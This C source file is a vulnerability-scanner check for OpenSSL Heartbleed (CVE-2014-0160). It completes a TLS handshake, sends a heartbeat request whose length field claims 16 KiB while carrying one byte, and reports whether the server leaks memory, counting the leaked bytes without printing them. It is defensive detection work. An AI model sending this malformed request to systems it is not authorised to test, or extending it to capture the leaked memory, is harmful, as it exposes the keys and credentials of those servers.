/* ssl-heartbleed - OpenSSL Heartbleed (CVE-2014-0160).
 *
 * Completes a TLS handshake up to ServerHelloDone, then sends a heartbeat
 * request that claims a 16 KiB payload but carries one byte. A vulnerable
 * server answers with a heartbeat record of about 16 KiB (memory it should
 * never send); a patched server ignores the request or answers with an
 * alert. Read only: the leaked bytes are counted, never printed or kept.
 *
 * VULNERABLE needs a heartbeat record of 1024 bytes or more back.
 * NOT VULNERABLE needs a completed handshake and the alert unexpected_message
 * (10) in answer to the request (servers without heartbeat support behave
 * like that; any other alert, for example protocol_version, proves nothing).
 * Silence, a closed connection or a non-TLS peer is not evidence - a patched server
 * that still supports heartbeats drops the request, and so does a filter in
 * front of a vulnerable one - so those print INFO and the reason.
 * Replaces ssl-heartbleed, ssl-heartbleed-2 and ssl-heartbleed-full.
 * Use only on networks you own or have permission to scan.
 */
#include "arsenal_tls.h"

#define HB_LEAK_MIN 1024 /* a real reply to a 1-byte request is under 40 */

int almap_script_run(AlScriptContext *ctx) {
    static const unsigned int versions[] = { 0x0302, 0x0303, 0x0301 };
    unsigned short ids[AR_TLS_MAXIDS];
    unsigned char rec[AR_TLS_MAX_RECORD];
    unsigned char hb[8];
    ar_tls_flight f;
    int nc;
    int vi;
    int fd = -1;
    int st = AR_TLS_F_ERR;
    int last_alert = -1;
    int guard;

    if (!ar_valid(ctx)) {
        return 1;
    }
    nc = ar_tls_suite_ids(ids, AR_TLS_MAXIDS, 0);
    for (vi = 0; vi < 3; vi++) {
        st = ar_tls_connect_hello(ctx, versions[vi], ids, nc, 1, 1, &f, &fd);
        if (st == AR_TLS_F_DONE) {
            break;
        }
        if (fd >= 0) {
            close(fd);
            fd = -1;
        }
        if (st == AR_TLS_F_ALERT) {
            last_alert = f.alert_desc; /* maybe only this version is refused */
        }
        if (st == AR_TLS_F_ERR) {
            break; /* not TLS, or no answer: other versions will not help */
        }
    }
    if (st != AR_TLS_F_DONE) {
        if (f.not_tls) {
            ar_out(ctx, "ssl-heartbleed: INFO not tested: the service did not answer with a TLS record");
        } else if (last_alert >= 0) {
            ar_out(ctx, "ssl-heartbleed: INFO not tested: no TLS handshake completed (server alert %d)", last_alert);
        } else {
            ar_out(ctx, "ssl-heartbleed: INFO not tested: no TLS handshake completed (no answer)");
        }
        return 0;
    }

    hb[0] = AR_TLS_HEARTBEAT;
    hb[1] = (unsigned char)(f.version >> 8);   /* the NEGOTIATED version: a */
    hb[2] = (unsigned char)(f.version & 255u); /* mismatch draws protocol_version */
    hb[3] = 0x00;
    hb[4] = 0x03;  /* record length: type + length + 1 byte of payload */
    hb[5] = 0x01;  /* heartbeat_request */
    hb[6] = 0x40;  /* payload_length 0x4000 ... */
    hb[7] = 0x00;  /* ... but only one byte follows (the one below the record) */
    if (as_send_all(fd, hb, sizeof(hb), ctx->timeout_ms) != 0) {
        close(fd);
        ar_out(ctx, "ssl-heartbleed: INFO not tested: could not send the heartbeat request");
        return 0;
    }
    for (guard = 0; guard < 4; guard++) {
        int type = 0;
        int n = ar_tls_recv_record(fd, &type, rec, sizeof(rec), ctx->timeout_ms);

        if (n < 0) {
            /* Silence, a close or a non-TLS reply is not evidence: a patched
             * server that still supports heartbeats drops the request, and
             * so does a filter in front of a vulnerable one. */
            ar_out(ctx, "ssl-heartbleed: INFO not conclusive: no heartbeat reply and no alert after the request (%s handshake completed; server heartbeat extension: %s)",
                   ar_tls_version_name(f.version),
                   f.hb_ext == 0 ? "not negotiated" : "negotiated");
            break;
        }
        if (type == AR_TLS_HEARTBEAT) {
            if (n >= HB_LEAK_MIN) {
                ar_out(ctx, "ssl-heartbleed: VULNERABLE (CVE-2014-0160): a 1-byte heartbeat request returned %d bytes (%s)",
                       n, ar_tls_version_name(f.version));
            } else {
                ar_out(ctx, "ssl-heartbleed: INFO unexpected short heartbeat reply (%d bytes); not conclusive", n);
            }
            break;
        }
        if (type == AR_TLS_ALERT) {
            if (n > 1 && rec[1] == 10) {
                /* unexpected_message: heartbeat records are not accepted at all */
                ar_out(ctx, "ssl-heartbleed: NOT VULNERABLE (%s handshake completed; the server rejected the heartbeat record with unexpected_message)",
                       ar_tls_version_name(f.version));
            } else {
                ar_out(ctx, "ssl-heartbleed: INFO alert %d in answer to the heartbeat request; not conclusive", n > 1 ? rec[1] : 0);
            }
            break;
        }
        if (guard == 3) {
            ar_out(ctx, "ssl-heartbleed: INFO no heartbeat or alert record after the request; not conclusive");
        }
    }
    close(fd);
    return 0;
}
